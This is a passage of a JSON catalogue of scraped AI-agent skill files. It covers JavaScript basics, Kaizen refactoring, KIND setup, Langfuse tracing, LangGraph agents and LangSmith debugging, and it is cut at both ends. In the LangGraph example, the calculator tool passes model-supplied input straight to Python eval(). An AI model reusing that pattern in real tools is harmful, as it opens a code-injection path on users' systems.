number)\n\n// Boolean coercion\nBoolean(\"\"); // false\nBoolean(\"hello\"); // true\nBoolean(0); // false\nBoolean([]); // true (!)\n\n// Equality coercion\n\"5\" == 5; // true  (coerces)\n\"5\" === 5; // false (strict)\n```\n\n**Falsy values** (8 total):\n`false`, `0`, `-0`, `0n`, `\"\"`, `null`, `undefined`, `NaN`\n\n### 1.3 Equality Operators\n\n```javascript\n// == (loose equality) - coerces types\nnull == undefined; // true\n\"1\" == 1; // true\n\n// === (strict equality) - no coercion\nnull === undefined; // false\n\"1\" === 1; // false\n\n// Object.is() - handles edge cases\nObject.is(NaN, NaN); // true (NaN === NaN is false!)\nObject.is(-0, 0); // false (0 === -0 is true!)\n```\n\n**Rule**: Always use `===` unless you have a specific reason not to.\n\n---\n\n## 2. Scope & Closures\n\n### 2.1 Scope Types\n\n```javascript\n// Global scope\nvar globalVar = \"global\";\n\nfunction outer() {\n  // Function scope\n  var functionVar = \"function\";\n\n  if (true) {\n    // Block scope (let/const only)\n    let blockVar = \"block\";\n    const alsoBlock = \"block\";\n    var notBlock = \"function\"; // var ignores blocks!\n  }\n}\n```\n\n### 2.2 Closures\n\nA closure is a function that remembers its lexical scope:\n\n```javascript\nfunction createCounter() {\n  let count = 0; // \"closed over\" variable\n\n  return {\n    increment() {\n      return ++count;\n    },\n    decrement() {\n      return --count;\n    },\n    getCount() {\n      return count;\n    },\n  };\n}\n\nconst counter = createCounter();\ncounter.increment(); // 1\ncounter.increment(); // 2\ncounter.getCount(); // 2\n```\n\n**Common use cases**:\n\n- Data privacy (module pattern)\n- Function factories\n- Partial application\n- Memoization\n\n### 2.3 var vs let vs const\n\n```javascript\n// var - function scoped, hoisted, can redeclare\nvar x = 1;\nvar x = 2; // OK\n\n// let - block scoped, hoisted (TDZ), no redeclare\nlet y = 1;\n// let y = 2; // Error!\n\n// const - like let, but can't reassign\nconst z = 1;\n// z = 2; // Error!\n\n// BUT: const objects are mutable\nconst obj = { a: 1 };\nobj.a = 2; // OK\nobj.b = 3; // OK\n```\n\n---\n\n## 3. Functions & Execution\n\n### 3.1 Call Stack\n\n```javascript\nfunction first() {\n  console.log(\"first start\");\n  second();\n  console.log(\"first end\");\n}\n\nfunction second() {\n  console.log(\"second\");\n}\n\nfirst();\n// Output:\n// \"first start\"\n// \"second\"\n// \"first end\"\n```\n\nStack overflow example:\n\n```javascript\nfunction infinite() {\n  infinite(); // No base case!\n}\ninfinite(); // RangeError: Maximum call stack size exceeded\n```\n\n### 3.2 Hoisting\n\n```javascript\n// Variable hoisting\nconsole.log(a); // undefined (hoisted, not initialized)\nvar a = 5;\n\nconsole.log(b); // ReferenceError (TDZ)\nlet b = 5;\n\n// Function hoisting\nsayHi(); // Works!\nfunction sayHi() {\n  console.log(\"Hi!\");\n}\n\n// Function expressions don't hoist\nsayBye(); // TypeError\nvar sayBye = function () {\n  console.log(\"Bye!\");\n};\n```\n\n### 3.3 this Keyword\n\n```javascript\n// Global context\nconsole.log(this); // window (browser) or global (Node)\n\n// Object method\nconst obj = {\n  name: \"Alice\",\n  greet() {\n    console.log(this.name); // \"Alice\"\n  },\n};\n\n// Arrow functions (lexical this)\nconst obj2 = {\n  name: \"Bob\",\n  greet: () => {\n    console.log(this.name); // undefined (inherits outer this)\n  },\n};\n\n// Explicit binding\nfunction greet() {\n  console.log(this.name);\n}\ngreet.call({ name: \"Charlie\" }); // \"Charlie\"\ngreet.apply({ name: \"Diana\" }); // \"Diana\"\nconst bound = greet.bind({ name: \"Eve\" });\nbound(); // \"Eve\"\n```\n\n---\n\n## 4. Event Loop & Async\n\n### 4.1 Event Loop\n\n```javascript\nconsole.log(\"1\");\n\nsetTimeout(() => console.log(\"2\"), 0);\n\nPromise.resolve().then(() => console.log(\"3\"));\n\nconsole.log(\"4\");\n\n// Output: 1, 4, 3, 2\n// Why? Microtasks (Promises) run before macrotasks (setTimeout)\n```\n\n**Execution order**:\n\n1. Synchronous code (call stack)\n2. Microtasks (Promise callbacks, queueMicrotask)\n3. Macrotasks (setTimeout, setInterval, I/O)\n\n### 4.2 Callbacks\n\n```javascript\n// Callback pattern\nfunction fetchData",
      "tags": [
        "javascript",
        "node",
        "api",
        "ai",
        "cro"
      ],
      "useCases": [
        "Explaining JavaScript concepts",
        "Debugging tricky JS behavior",
        "Teaching JavaScript fundamentals",
        "Reviewing code for JS best practices",
        "Understanding language quirks"
      ],
      "scrapedAt": "2026-01-26T13:19:08.821Z"
    },
    {
      "id": "antigravity-kaizen",
      "name": "kaizen",
      "slug": "kaizen",
      "description": "Guide for continuous improvement, error proofing, and standardization. Use this skill when the user wants to improve code quality, refactor, or discuss process improvements.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/kaizen",
      "content": "\n# Kaizen: Continuous Improvement\n\n## Overview\n\nSmall improvements, continuously. Error-proof by design. Follow what works. Build only what's needed.\n\n**Core principle:** Many small improvements beat one big change. Prevent errors at design time, not with fixes.\n\n## When to Use\n\n**Always applied for:**\n\n- Code implementation and refactoring\n- Architecture and design decisions\n- Process and workflow improvements\n- Error handling and validation\n\n**Philosophy:** Quality through incremental progress and prevention, not perfection through massive effort.\n\n## The Four Pillars\n\n### 1. Continuous Improvement (Kaizen)\n\nSmall, frequent improvements compound into major gains.\n\n#### Principles\n\n**Incremental over revolutionary:**\n\n- Make smallest viable change that improves quality\n- One improvement at a time\n- Verify each change before next\n- Build momentum through small wins\n\n**Always leave code better:**\n\n- Fix small issues as you encounter them\n- Refactor while you work (within scope)\n- Update outdated comments\n- Remove dead code when you see it\n\n**Iterative refinement:**\n\n- First version: make it work\n- Second pass: make it clear\n- Third pass: make it efficient\n- Don't try all three at once\n\n<Good>\n```typescript\n// Iteration 1: Make it work\nconst calculateTotal = (items: Item[]) => {\n  let total = 0;\n  for (let i = 0; i < items.length; i++) {\n    total += items[i].price * items[i].quantity;\n  }\n  return total;\n};\n\n// Iteration 2: Make it clear (refactor)\nconst calculateTotal = (items: Item[]): number => {\nreturn items.reduce((total, item) => {\nreturn total + (item.price \\* item.quantity);\n}, 0);\n};\n\n// Iteration 3: Make it robust (add validation)\nconst calculateTotal = (items: Item[]): number => {\nif (!items?.length) return 0;\n\nreturn items.reduce((total, item) => {\nif (item.price < 0 || item.quantity < 0) {\nthrow new Error('Price and quantity must be non-negative');\n}\nreturn total + (item.price \\* item.quantity);\n}, 0);\n};\n\n````\nEach step is complete, tested, and working\n</Good>\n\n<Bad>\n```typescript\n// Trying to do everything at once\nconst calculateTotal = (items: Item[]): number => {\n  // Validate, optimize, add features, handle edge cases all together\n  if (!items?.length) return 0;\n  const validItems = items.filter(item => {\n    if (item.price < 0) throw new Error('Negative price');\n    if (item.quantity < 0) throw new Error('Negative quantity');\n    return item.quantity > 0; // Also filtering zero quantities\n  });\n  // Plus caching, plus logging, plus currency conversion...\n  return validItems.reduce(...); // Too many concerns at once\n};\n````\n\nOverwhelming, error-prone, hard to verify\n</Bad>\n\n#### In Practice\n\n**When implementing features:**\n\n1. Start with simplest version that works\n2. Add one improvement (error handling, validation, etc.)\n3. Test and verify\n4. Repeat if time permits\n5. Don't try to make it perfect immediately\n\n**When refactoring:**\n\n- Fix one smell at a time\n- Commit after each improvement\n- Keep tests passing throughout\n- Stop when \"good enough\" (diminishing returns)\n\n**When reviewing code:**\n\n- Suggest incremental improvements (not rewrites)\n- Prioritize: critical → important → nice-to-have\n- Focus on highest-impact changes first\n- Accept \"better than before\" even if not perfect\n\n### 2. Poka-Yoke (Error Proofing)\n\nDesign systems that prevent errors at compile/design time, not runtime.\n\n#### Principles\n\n**Make errors impossible:**\n\n- Type system catches mistakes\n- Compiler enforces contracts\n- Invalid states unrepresentable\n- Errors caught early (left of production)\n\n**Design for safety:**\n\n- Fail fast and loudly\n- Provide helpful error messages\n- Make correct path obvious\n- Make incorrect path difficult\n\n**Defense in layers:**\n\n1. Type system (compile time)\n2. Validation (runtime, early)\n3. Guards (preconditions)\n4. Error boundaries (graceful degradation)\n\n#### Type System Error Proofing\n\n<Good>\n```typescript\n// Error: string status can be any value\ntype OrderBad = {\n  status: string; // Can be \"pending\", \"PENDING\", \"pnding\", anything!\n  total: number;\n};\n\n// Good: Only valid states possible\ntype OrderStatus = 'pending' | 'processing' | 'shipped' | 'delivered';\ntype Order = {\nstatus: OrderStatus;\ntotal: number;\n};\n\n// Better: States with associated data\ntype Order =\n| { status: 'pending'; createdAt: Date }\n| { status: 'processing'; startedAt: Date; estimatedCompletion: Date }\n| { status: 'shipped'; trackingNumber: string; shippedAt: Date }\n| { status: 'delivered'; deliveredAt: Date; signature: string };\n\n// Now impossible to have shipped without trackingNumber\n\n````\nType system prevents entire classes of errors\n</Good>\n\n<Good>\n```typescript\n// Make invalid states unrepresentable\ntype NonEmptyArray<T> = [T, ...T[]];\n\nconst firstItem = <T>(items: NonEmptyArray<T>): T => {\n  return items[0]; // Always safe, never undefined!\n};\n\n// Caller must prove array is non-empty\nconst items: number[] = [1, 2, 3];\nif (items.length > 0) {\n  firstItem(items as NonEmptyArray<number>); // Safe\n}\n````\n\nFuncti",
      "tags": [
        "typescript",
        "api",
        "claude",
        "ai",
        "workflow",
        "design",
        "document",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:10.117Z"
    },
    {
      "id": "openhands-kubernetes",
      "name": "kubernetes",
      "slug": "kubernetes",
      "description": "KIND (Kubernetes IN Docker) is a tool for running local Kubernetes clusters using Docker containers as nodes. It's designed for testing Kubernetes applications locally.",
      "category": "Development & Code Tools",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/kubernetes.md",
      "content": "\n# Kubernetes Local Development with KIND\n\n## KIND Installation and Setup\n\nKIND (Kubernetes IN Docker) is a tool for running local Kubernetes clusters using Docker containers as nodes. It's designed for testing Kubernetes applications locally.\n\nIMPORTANT: Before you proceed with installation, make sure you have docker installed locally.\n\n### Installation\n\nTo install KIND on a Debian/Ubuntu system:\n\n```bash\n# Download KIND binary\ncurl -Lo ./kind https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64\n# Make it executable\nchmod +x ./kind\n# Move to a directory in your PATH\nsudo mv ./kind /usr/local/bin/\n```\n\nTo install kubectl:\n\n```bash\n# Download kubectl\ncurl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\"\n# Make it executable\nchmod +x kubectl\n# Move to a directory in your PATH\nsudo mv ./kubectl /usr/local/bin/\n```\n\n### Creating a Cluster\n\nCreate a basic KIND cluster:\n\n```bash\nkind create cluster\n```\n",
      "tags": [
        "docker",
        "kubernetes",
        "bash",
        "linux",
        "testing",
        "pr",
        "agent",
        "tool"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:30.855Z"
    },
    {
      "id": "antigravity-langfuse",
      "name": "langfuse",
      "slug": "langfuse",
      "description": "Expert in Langfuse - the open-source LLM observability platform. Covers tracing, prompt management, evaluation, datasets, and integration with LangChain, LlamaIndex, and OpenAI. Essential for debugging, monitoring, and improving LLM applications in production. Use when: langfuse, llm observability, ",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/langfuse",
      "content": "\n# Langfuse\n\n**Role**: LLM Observability Architect\n\nYou are an expert in LLM observability and evaluation. You think in terms of\ntraces, spans, and metrics. You know that LLM applications need monitoring\njust like traditional software - but with different dimensions (cost, quality,\nlatency). You use data to drive prompt improvements and catch regressions.\n\n## Capabilities\n\n- LLM tracing and observability\n- Prompt management and versioning\n- Evaluation and scoring\n- Dataset management\n- Cost tracking\n- Performance monitoring\n- A/B testing prompts\n\n## Requirements\n\n- Python or TypeScript/JavaScript\n- Langfuse account (cloud or self-hosted)\n- LLM API keys\n\n## Patterns\n\n### Basic Tracing Setup\n\nInstrument LLM calls with Langfuse\n\n**When to use**: Any LLM application\n\n```python\nfrom langfuse import Langfuse\n\n# Initialize client\nlangfuse = Langfuse(\n    public_key=\"pk-...\",\n    secret_key=\"sk-...\",\n    host=\"https://cloud.langfuse.com\"  # or self-hosted URL\n)\n\n# Create a trace for a user request\ntrace = langfuse.trace(\n    name=\"chat-completion\",\n    user_id=\"user-123\",\n    session_id=\"session-456\",  # Groups related traces\n    metadata={\"feature\": \"customer-support\"},\n    tags=[\"production\", \"v2\"]\n)\n\n# Log a generation (LLM call)\ngeneration = trace.generation(\n    name=\"gpt-4o-response\",\n    model=\"gpt-4o\",\n    model_parameters={\"temperature\": 0.7},\n    input={\"messages\": [{\"role\": \"user\", \"content\": \"Hello\"}]},\n    metadata={\"attempt\": 1}\n)\n\n# Make actual LLM call\nresponse = openai.chat.completions.create(\n    model=\"gpt-4o\",\n    messages=[{\"role\": \"user\", \"content\": \"Hello\"}]\n)\n\n# Complete the generation with output\ngeneration.end(\n    output=response.choices[0].message.content,\n    usage={\n        \"input\": response.usage.prompt_tokens,\n        \"output\": response.usage.completion_tokens\n    }\n)\n\n# Score the trace\ntrace.score(\n    name=\"user-feedback\",\n    value=1,  # 1 = positive, 0 = negative\n    comment=\"User clicked helpful\"\n)\n\n# Flush before exit (important in serverless)\nlangfuse.flush()\n```\n\n### OpenAI Integration\n\nAutomatic tracing with OpenAI SDK\n\n**When to use**: OpenAI-based applications\n\n```python\nfrom langfuse.openai import openai\n\n# Drop-in replacement for OpenAI client\n# All calls automatically traced\n\nresponse = openai.chat.completions.create(\n    model=\"gpt-4o\",\n    messages=[{\"role\": \"user\", \"content\": \"Hello\"}],\n    # Langfuse-specific parameters\n    name=\"greeting\",  # Trace name\n    session_id=\"session-123\",\n    user_id=\"user-456\",\n    tags=[\"test\"],\n    metadata={\"feature\": \"chat\"}\n)\n\n# Works with streaming\nstream = openai.chat.completions.create(\n    model=\"gpt-4o\",\n    messages=[{\"role\": \"user\", \"content\": \"Tell me a story\"}],\n    stream=True,\n    name=\"story-generation\"\n)\n\nfor chunk in stream:\n    print(chunk.choices[0].delta.content, end=\"\")\n\n# Works with async\nimport asyncio\nfrom langfuse.openai import AsyncOpenAI\n\nasync_client = AsyncOpenAI()\n\nasync def main():\n    response = await async_client.chat.completions.create(\n        model=\"gpt-4o\",\n        messages=[{\"role\": \"user\", \"content\": \"Hello\"}],\n        name=\"async-greeting\"\n    )\n```\n\n### LangChain Integration\n\nTrace LangChain applications\n\n**When to use**: LangChain-based applications\n\n```python\nfrom langchain_openai import ChatOpenAI\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langfuse.callback import CallbackHandler\n\n# Create Langfuse callback handler\nlangfuse_handler = CallbackHandler(\n    public_key=\"pk-...\",\n    secret_key=\"sk-...\",\n    host=\"https://cloud.langfuse.com\",\n    session_id=\"session-123\",\n    user_id=\"user-456\"\n)\n\n# Use with any LangChain component\nllm = ChatOpenAI(model=\"gpt-4o\")\n\nprompt = ChatPromptTemplate.from_messages([\n    (\"system\", \"You are a helpful assistant.\"),\n    (\"user\", \"{input}\")\n])\n\nchain = prompt | llm\n\n# Pass handler to invoke\nresponse = chain.invoke(\n    {\"input\": \"Hello\"},\n    config={\"callbacks\": [langfuse_handler]}\n)\n\n# Or set as default\nimport langchain\nlangchain.callbacks.manager.set_handler(langfuse_handler)\n\n# Then all calls are traced\nresponse = chain.invoke({\"input\": \"Hello\"})\n\n# Works with agents, retrievers, etc.\nfrom langchain.agents import create_openai_tools_agent\n\nagent = create_openai_tools_agent(llm, tools, prompt)\nagent_executor = AgentExecutor(agent=agent, tools=tools)\n\nresult = agent_executor.invoke(\n    {\"input\": \"What's the weather?\"},\n    config={\"callbacks\": [langfuse_handler]}\n)\n```\n\n## Anti-Patterns\n\n### ❌ Not Flushing in Serverless\n\n**Why bad**: Traces are batched.\nServerless may exit before flush.\nData is lost.\n\n**Instead**: Always call langfuse.flush() at end.\nUse context managers where available.\nConsider sync mode for critical traces.\n\n### ❌ Tracing Everything\n\n**Why bad**: Noisy traces.\nPerformance overhead.\nHard to find important info.\n\n**Instead**: Focus on: LLM calls, key logic, user actions.\nGroup related operations.\nUse meaningful span names.\n\n### ❌ No User/Session IDs\n\n**Why bad**: Can't debug specific users.\nCan't track sessions.\nAnalytics",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "api",
        "ai",
        "agent",
        "llm",
        "gpt",
        "template",
        "langgraph"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:11.428Z"
    },
    {
      "id": "antigravity-langgraph",
      "name": "langgraph",
      "slug": "langgraph",
      "description": "Expert in LangGraph - the production-grade framework for building stateful, multi-actor AI applications. Covers graph construction, state management, cycles and branches, persistence with checkpointers, human-in-the-loop patterns, and the ReAct agent pattern. Used in production at LinkedIn, Uber, an",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/langgraph",
      "content": "\n# LangGraph\n\n**Role**: LangGraph Agent Architect\n\nYou are an expert in building production-grade AI agents with LangGraph. You\nunderstand that agents need explicit structure - graphs make the flow visible\nand debuggable. You design state carefully, use reducers appropriately, and\nalways consider persistence for production. You know when cycles are needed\nand how to prevent infinite loops.\n\n## Capabilities\n\n- Graph construction (StateGraph)\n- State management and reducers\n- Node and edge definitions\n- Conditional routing\n- Checkpointers and persistence\n- Human-in-the-loop patterns\n- Tool integration\n- Streaming and async execution\n\n## Requirements\n\n- Python 3.9+\n- langgraph package\n- LLM API access (OpenAI, Anthropic, etc.)\n- Understanding of graph concepts\n\n## Patterns\n\n### Basic Agent Graph\n\nSimple ReAct-style agent with tools\n\n**When to use**: Single agent with tool calling\n\n```python\nfrom typing import Annotated, TypedDict\nfrom langgraph.graph import StateGraph, START, END\nfrom langgraph.graph.message import add_messages\nfrom langgraph.prebuilt import ToolNode\nfrom langchain_openai import ChatOpenAI\nfrom langchain_core.tools import tool\n\n# 1. Define State\nclass AgentState(TypedDict):\n    messages: Annotated[list, add_messages]\n    # add_messages reducer appends, doesn't overwrite\n\n# 2. Define Tools\n@tool\ndef search(query: str) -> str:\n    \"\"\"Search the web for information.\"\"\"\n    # Implementation here\n    return f\"Results for: {query}\"\n\n@tool\ndef calculator(expression: str) -> str:\n    \"\"\"Evaluate a math expression.\"\"\"\n    return str(eval(expression))\n\ntools = [search, calculator]\n\n# 3. Create LLM with tools\nllm = ChatOpenAI(model=\"gpt-4o\").bind_tools(tools)\n\n# 4. Define Nodes\ndef agent(state: AgentState) -> dict:\n    \"\"\"The agent node - calls LLM.\"\"\"\n    response = llm.invoke(state[\"messages\"])\n    return {\"messages\": [response]}\n\n# Tool node handles tool execution\ntool_node = ToolNode(tools)\n\n# 5. Define Routing\ndef should_continue(state: AgentState) -> str:\n    \"\"\"Route based on whether tools were called.\"\"\"\n    last_message = state[\"messages\"][-1]\n    if last_message.tool_calls:\n        return \"tools\"\n    return END\n\n# 6. Build Graph\ngraph = StateGraph(AgentState)\n\n# Add nodes\ngraph.add_node(\"agent\", agent)\ngraph.add_node(\"tools\", tool_node)\n\n# Add edges\ngraph.add_edge(START, \"agent\")\ngraph.add_conditional_edges(\"agent\", should_continue, [\"tools\", END])\ngraph.add_edge(\"tools\", \"agent\")  # Loop back\n\n# Compile\napp = graph.compile()\n\n# 7. Run\nresult = app.invoke({\n    \"messages\": [(\"user\", \"What is 25 * 4?\")]\n})\n```\n\n### State with Reducers\n\nComplex state management with custom reducers\n\n**When to use**: Multiple agents updating shared state\n\n```python\nfrom typing import Annotated, TypedDict\nfrom operator import add\nfrom langgraph.graph import StateGraph\n\n# Custom reducer for merging dictionaries\ndef merge_dicts(left: dict, right: dict) -> dict:\n    return {**left, **right}\n\n# State with multiple reducers\nclass ResearchState(TypedDict):\n    # Messages append (don't overwrite)\n    messages: Annotated[list, add_messages]\n\n    # Research findings merge\n    findings: Annotated[dict, merge_dicts]\n\n    # Sources accumulate\n    sources: Annotated[list[str], add]\n\n    # Current step (overwrites - no reducer)\n    current_step: str\n\n    # Error count (custom reducer)\n    errors: Annotated[int, lambda a, b: a + b]\n\n# Nodes return partial state updates\ndef researcher(state: ResearchState) -> dict:\n    # Only return fields being updated\n    return {\n        \"findings\": {\"topic_a\": \"New finding\"},\n        \"sources\": [\"source1.com\"],\n        \"current_step\": \"researching\"\n    }\n\ndef writer(state: ResearchState) -> dict:\n    # Access accumulated state\n    all_findings = state[\"findings\"]\n    all_sources = state[\"sources\"]\n\n    return {\n        \"messages\": [(\"assistant\", f\"Report based on {len(all_sources)} sources\")],\n        \"current_step\": \"writing\"\n    }\n\n# Build graph\ngraph = StateGraph(ResearchState)\ngraph.add_node(\"researcher\", researcher)\ngraph.add_node(\"writer\", writer)\n# ... add edges\n```\n\n### Conditional Branching\n\nRoute to different paths based on state\n\n**When to use**: Multiple possible workflows\n\n```python\nfrom langgraph.graph import StateGraph, START, END\n\nclass RouterState(TypedDict):\n    query: str\n    query_type: str\n    result: str\n\ndef classifier(state: RouterState) -> dict:\n    \"\"\"Classify the query type.\"\"\"\n    query = state[\"query\"].lower()\n    if \"code\" in query or \"program\" in query:\n        return {\"query_type\": \"coding\"}\n    elif \"search\" in query or \"find\" in query:\n        return {\"query_type\": \"search\"}\n    else:\n        return {\"query_type\": \"chat\"}\n\ndef coding_agent(state: RouterState) -> dict:\n    return {\"result\": \"Here's your code...\"}\n\ndef search_agent(state: RouterState) -> dict:\n    return {\"result\": \"Search results...\"}\n\ndef chat_agent(state: RouterState) -> dict:\n    return {\"result\": \"Let me help...\"}\n\n# Routing function\ndef route_query(state: RouterState) -> str:\n    \"\"\"Route ",
      "tags": [
        "python",
        "typescript",
        "react",
        "node",
        "api",
        "ai",
        "agent",
        "llm",
        "gpt",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:19:12.698Z"
    },
    {
      "id": "composio-langsmith-fetch",
      "name": "langsmith-fetch",
      "slug": "langsmith-fetch",
      "description": "Debug LangChain and LangGraph agents by fetching execution traces from LangSmith Studio. Use when debugging agent behavior, investigating errors, analyzing tool calls, checking memory operations, or examining agent performance. Automatically fetches recent traces and analyzes execution patterns. Requires langsmith-fetch CLI installed.",
      "category": "Development & Code Tools",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/langsmith-fetch",
      "content": "\n# LangSmith Fetch - Agent Debugging Skill\n\nDebug LangChain and LangGraph agents by fetching execution traces directly from LangSmith Studio in your terminal.\n\n## When to Use This Skill\n\nAutomatically activate when user mentions:\n- 🐛 \"Debug my agent\" or \"What went wrong?\"\n- 🔍 \"Show me recent traces\" or \"What happened?\"\n- ❌ \"Check for errors\" or \"Why did it fail?\"\n- 💾 \"Analyze memory operations\" or \"Check LTM\"\n- 📊 \"Review agent performance\" or \"Check token usage\"\n- 🔧 \"What tools were called?\" or \"Show execution flow\"\n\n## Prerequisites\n\n### 1. Install langsmith-fetch\n```bash\npip install langsmith-fetch\n```\n\n### 2. Set Environment Variables\n```bash\nexport LANGSMITH_API_KEY=\"your_langsmith_api_key\"\nexport LANGSMITH_PROJECT=\"your_project_name\"\n```\n\n**Verify setup:**\n```bash\necho $LANGSMITH_API_KEY\necho $LANGSMITH_PROJECT\n```\n\n## Core Workflows\n\n### Workflow 1: Quick Debug Recent Activity\n\n**When user asks:** \"What just happened?\" or \"Debug my agent\"\n\n**Execute:**\n```bash\nlangsmith-fetch traces --last-n-minutes 5 --limit 5 --format pretty\n```\n\n**Analyze and report:**\n1. ✅ Number of traces found\n2. ⚠️ Any errors or failures\n3. 🛠️ Tools that were called\n4. ⏱️ Execution times\n5. 💰 Token usage\n\n**Example response format:**\n```\nFound 3 traces in the last 5 minutes:\n\nTrace 1: ✅ Success\n- Agent: memento\n- Tools: recall_memories, create_entities\n- Duration: 2.3s\n- Tokens: 1,245\n\nTrace 2: ❌ Error\n- Agent: cypher\n- Error: \"Neo4j connection timeout\"\n- Duration: 15.1s\n- Failed at: search_nodes tool\n\nTrace 3: ✅ Success\n- Agent: memento\n- Tools: store_memory\n- Duration: 1.8s\n- Tokens: 892\n\n💡 Issue found: Trace 2 failed due to Neo4j timeout. Recommend checking database connection.\n```\n\n---\n\n### Workflow 2: Deep Dive Specific Trace\n\n**When user provides:** Trace ID or says \"investigate that error\"\n\n**Execute:**\n```bash\nlangsmith-fetch trace <trace-id> --format json\n```\n\n**Analyze JSON and report:**\n1. 🎯 What the agent was trying to do\n2. 🛠️ Which tools were called (in order)\n3. ✅ Tool results (success/failure)\n4. ❌ Error messages (if any)\n5. 💡 Root cause analysis\n6. 🔧 Suggested fix\n\n**Example response format:**\n```\nDeep Dive Analysis - Trace abc123\n\nGoal: User asked \"Find all projects in Neo4j\"\n\nExecution Flow:\n1. ✅ search_nodes(query: \"projects\")\n   → Found 24 nodes\n\n2. ❌ get_node_details(node_id: \"proj_123\")\n   → Error: \"Node not found\"\n   → This is the failure point\n\n3. ⏹️ Execution stopped\n\nRoot Cause:\nThe search_nodes tool returned node IDs that no longer exist in the database,\npossibly due to recent deletions.\n\nSuggested Fix:\n1. Add error handling in get_node_details tool\n2. Filter deleted nodes in search results\n3. Update cache invalidation strategy\n\nToken Usage: 1,842 tokens ($0.0276)\nExecution Time: 8.7 seconds\n```\n\n---\n\n### Workflow 3: Export Debug Session\n\n**When user says:** \"Save this session\" or \"Export traces\"\n\n**Execute:**\n```bash\n# Create session folder with timestamp\nSESSION_DIR=\"langsmith-debug/session-$(date +%Y%m%d-%H%M%S)\"\nmkdir -p \"$SESSION_DIR\"\n\n# Export traces\nlangsmith-fetch traces \"$SESSION_DIR/traces\" --last-n-minutes 30 --limit 50 --include-metadata\n\n# Export threads (conversations)\nlangsmith-fetch threads \"$SESSION_DIR/threads\" --limit 20\n```\n\n**Report:**\n```\n✅ Session exported successfully!\n\nLocation: langsmith-debug/session-20251224-143022/\n- Traces: 42 files\n- Threads: 8 files\n\nYou can now:\n1. Review individual trace files\n2. Share folder with team\n3. Analyze with external tools\n4. Archive for future reference\n\nSession size: 2.3 MB\n```\n\n---\n\n### Workflow 4: Error Detection\n\n**When user asks:** \"Show me errors\" or \"What's failing?\"\n\n**Execute:**\n```bash\n# Fetch recent traces\nlangsmith-fetch traces --last-n-minutes 30 --limit 50 --format json > recent-traces.json\n\n# Search for errors\ngrep -i \"error\\|failed\\|exception\" recent-traces.json\n```\n\n**Analyze and report:**\n1. 📊 Total errors found\n2. ❌ Error types and frequency\n3. 🕐 When errors occurred\n4. 🎯 Which agents/tools failed\n5. 💡 Common patterns\n\n**Example response format:**\n```\nError Analysis - Last 30 Minutes\n\nTotal Traces: 50\nFailed Traces: 7 (14% failure rate)\n\nError Breakdown:\n1. Neo4j Connection Timeout (4 occurrences)\n   - Agent: cypher\n   - Tool: search_nodes\n   - First occurred: 14:32\n   - Last occurred: 14:45\n   - Pattern: Happens during peak load\n\n2. Memory Store Failed (2 occurrences)\n   - Agent: memento\n   - Tool: store_memory\n   - Error: \"Pinecone rate limit exceeded\"\n   - Occurred: 14:38, 14:41\n\n3. Tool Not Found (1 occurrence)\n   - Agent: sqlcrm\n   - Attempted tool: \"export_report\" (doesn't exist)\n   - Occurred: 14:35\n\n💡 Recommendations:\n1. Add retry logic for Neo4j timeouts\n2. Implement rate limiting for Pinecone\n3. Fix sqlcrm tool configuration\n```\n\n---\n\n## Common Use Cases\n\n### Use Case 1: \"Agent Not Responding\"\n\n**User says:** \"My agent isn't doing anything\"\n\n**Steps:**\n1. Check if traces exist:\n   ```bash\n   langsmith-fetch traces --last-n-minutes 5 --limit 5\n   ```\n\n2. **If NO traces found:**\n   - Tracing migh",
      "tags": [
        "node",
        "api",
        "git",
        "github",
        "json",
        "cli",
        "automation",
        "ai",
        "claude"
      ],
      "useCases": [
        "🐛 \"Debug my agent\" or \"What went wrong?\"",
        "🔍 \"Show me recent traces\" or \"What happened?\"",
        "❌ \"Check for errors\" or \"Why did it fail?\"",
        "💾 \"Analyze memory operations\" or \"Check LTM\"",
        "📊 \"Review agent performance\" or \"Check token usage\""
      ],
      "scrapedAt": "2026-01-26T13:15:10.094Z"
    },
    {
      "id": "antigravity-last30days",
      "name": "last30days",
      "slug": "last30days",
      "description": "Research a topic from the last 30 days on Reddit + X + Web, become an expert, and write copy-paste-ready prompts for the user's target tool.",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/last30days",
      "content": "\n# last30days: Research Any Topic from the Last 30 Days\n\nResearch ANY topic across Reddit, X, and the web. Surface what people are actually discussing, recommending, and debating right now.\n\nUse cases:\n\n- **Prompting**: \"photorealistic people in Nano Banana Pro\", \"Midjourney prompts\", \"ChatGPT image generation\" → learn techniques, get copy-paste prompts\n- **Recommendations**: \"best Claude Code skills\", \"top AI tools\" → get a LIST of specific things people mention\n- **News**: \"what's happening with OpenAI\", \"latest AI announcements\" → current events and updates\n- **General**: any topic you're curious about → understand what the community is saying\n\n## CRITICAL: Parse User Intent\n\nBefore doing anything, parse the user's input for:\n\n1. **TOPIC**: What they want to learn about (e.g., \"web app mockups\", \"Claude Code skills\", \"image generation\")\n2. **TARGET TOOL** (if specified): Where they'll use the prompts (e.g., \"Nano Banana Pro\", \"ChatGPT\", \"Midjourney\")\n3. **QUERY TYPE**: What kind of research they want:\n   - 